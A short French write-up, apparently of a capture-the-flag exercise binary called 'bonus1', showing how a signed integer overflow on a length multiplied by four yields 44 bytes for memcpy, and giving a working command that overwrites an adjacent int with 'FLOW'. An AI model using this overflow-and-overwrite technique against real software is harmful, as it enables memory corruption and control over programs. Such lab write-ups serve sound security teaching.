On remarque qu'entre le dest de memcpy et l'adresse de l'int qui est comparé à `0x574f4c46`, il y a 40 bytes de différence. On souhaiterait donc pouvoir écrire sur 44 bytes afin d'éditer l'int en question.

Heureusement on peut faire un underflow grâce à la multiplication par 4, on obtient donc
```c
#include <stdint.h>
#include <stdio.h>

int main(void) {
  int32_t a = -2147483648;

  a += 11;
  printf("%d\n", a); // -2147483637
  printf("%d\n", a * 4); // 44
}
```

Maintenant qu'on peut éditer l'int, il suffit de mettre 40 valeurs garbage + l'int voulu en hexa:
```bash
./bonus1 -2147483637 "$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')"
```
